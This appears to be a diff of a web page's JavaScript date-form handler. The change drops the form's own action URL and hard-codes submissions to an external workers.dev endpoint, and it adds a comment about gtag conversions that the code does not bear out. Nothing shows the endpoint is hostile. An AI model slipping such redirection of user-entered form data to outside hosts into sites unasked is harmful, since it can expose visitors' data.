@@ -612,9 +612,6 @@
             // Get the form element
             var form = document.getElementById("dateForm");
 
-            // Get the form action URL
-            var formAction = form.action;
-
             // Add a submit event listener to the form
             form.addEventListener("submit", function (event) {
                 // Prevent the default form submission
@@ -646,12 +643,12 @@
                     return; // Prevent form submission if there's an error
                 }
 
-                // If there are no errors, send the form data to the actions page
-                sendDataToActionsPage(formAction);
+                // If there are no errors, you can submit the form and send the conversion to gtag
+
+                sendDataToActionsPage();
             });
 
-            function sendDataToActionsPage(actionUrl) {
-                // Deactivate all inputs and buttons inside the form
+            function sendDataToActionsPage() {
                 deactivateFormElements();
                 // Extract form data
                 var formData = new FormData(form);
@@ -659,12 +656,11 @@
                 // Create a new XMLHttpRequest object
                 var xhr = new XMLHttpRequest();
 
-                // Set up the request with the retrieved action URL
-                xhr.open("POST", actionUrl, true);
+                // Set up the request
+                xhr.open("POST", "https://post.biz-6ef.workers.dev/", true);
 
                 // Set the callback function for when the request completes
                 xhr.onload = function () {
-                    // Reactivate all inputs and buttons inside the form
                     reactivateFormElements();
                     if (xhr.status === 200) {
                         // The request was successful
